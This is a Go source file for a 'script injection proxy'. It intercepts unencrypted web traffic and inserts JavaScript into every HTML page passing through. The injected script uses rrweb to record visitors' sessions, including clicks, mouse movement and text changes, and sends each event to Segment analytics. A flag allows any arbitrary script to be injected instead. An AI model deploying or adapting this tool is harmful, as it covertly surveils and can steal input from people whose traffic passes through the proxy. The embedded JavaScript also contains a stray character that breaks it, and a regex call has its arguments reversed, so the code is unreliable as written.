package main

import (
	"bytes"
	"flag"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"regexp"
	"strings"

	"github.com/elazarl/goproxy"
)

var (
	flagFilename        = flag.String("filename", "", "Path containing the html file to inject into clear unenecrypted pages")
	flagExternal        = flag.Bool("ext", false, "Load an external script using the filename flag's input")
	flagVerbose         = flag.Bool("v", false, "Proxy verbosity")
	scrySegmentWriteKey = os.Getenv("SCRY_WRITE_KEY")
	scryBanner          = `
	(\____/)
	( ͡ ͡° ͜ ʖ ͡ ͡°)
	\╭☞ \╭☞
	`
)

var snippet string = `
<script src="https://cdn.jsdelivr.net/npm/rrweb@0.7.0/dist/rrweb.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/rrweb-player@latest/dist/index.js"></script>
<script>
	!function(){var analytics=window.analytics=window.analytics||[];if(!analytics.initialize)if(analytics.invoked)window.console&&console.error&&console.error("Segment snippet included twice.");else{analytics.invoked=!0;analytics.methods=["trackSubmit","trackClick","trackLink","trackForm","pageview","identify","reset","group","track","ready","alias","debug","page","once","off","on","addSourceMiddleware","addIntegrationMiddleware","setAnonymousId","addDestinationMiddleware"];analytics.factory=function(e){return function(){var t=Array.prototype.slice.call(arguments);t.unshift(e);analytics.push(t);return analytics}};for(var e=0;e<analytics.methods.length;e++){var key=analytics.methods[e];analytics[key]=analytics.factory(key)}analytics.load=function(key,e){var t=document.createElement("script");t.type="text/javascript";t.async=!0;t.src="https://cdn.segment.com/analytics.js/v1/" + key + "/analytics.min.js";var n=document.getElementsByTagName("script")[0];n.parentNode.insertBefore(t,n);analytics._loadOptions=e};analytics.SNIPPET_VERSION="4.13.1";
analytics.load("SCRY_WRITE_KEY");
analytics.identify();
}}();
  let events = [];
  let stopFn = rrweb.record({
  emit(event) {
	events.push(event)
	let eventName = "Website Interaction"
	if (event.type == 0) {
		  eventName = "New Session"
	}
	if (event.type == 4) {
		  eventName = "Screen Rendered"
	}
	if (event.data.source ==2 ){
	  eventName = "Mouse Clicked"
		if (event.data.type == 1) {
		  eventName = "Mouse Clicked Down"
		} if (event.data.type == 2) {
		  eventName = "Mouse Clicked Up"

		} Z
	}
	  if (event.data.source == 1){
		eventName = "Mouse Movement"
	}

	if (event.data.source ==0 ){
	  eventName = "Element Rendered"
	}

	if (event.data.source ==5 ){
	  if  ('text' in event.data) { 
	  eventName = "Text Changed"
	  }
	}
	  analytics.track(eventName, {
	  data:event,
	})
  },
});
</script>
`

func orPanic(err error) {
	flag.Parse()

	if *flagVerbose {
		if err != nil {
			panic(err)
		}
	}
}
func main() {
	flag.Parse()
	fmt.Println("SCRY script injection proxy")
	fmt.Println(scryBanner)

	if *flagExternal {
		scriptFile, err := ioutil.ReadFile(*flagFilename)
		if err != nil {
			log.Fatal(err)
		}
		snippet = string(scriptFile)
	}

	proxy := goproxy.NewProxyHttpServer()
	proxy.Verbose = *flagVerbose

	proxy.OnResponse().DoFunc(func(r *http.Response, ctx *goproxy.ProxyCtx) *http.Response {
		// println(ctx.Req.Host, "->", r.Header.Get("Content-Type"))
		log.Println(r.Header.Get("content-type"))
		// if regexp.Match(r.Header.Get("content-type"),"text/	html")
		isHTML, _ := regexp.Match(r.Header.Get("content-type"), []byte("text/html"))
		if isHTML {
			b, _ := ioutil.ReadAll(r.Body)
			buf := bytes.NewBufferString(strings.Replace(snippet, "SCRY_WRITE_KEY", scrySegmentWriteKey, 1))
			log.Println("Injecting tracking script")
			buf.Write(b)
			r.Body = ioutil.NopCloser(buf)
			r.Header["Content-Length"] = []string{fmt.Sprint(buf.Len())}
		}
		return r

	})
	log.Fatal(http.ListenAndServe(":8888", proxy))
}
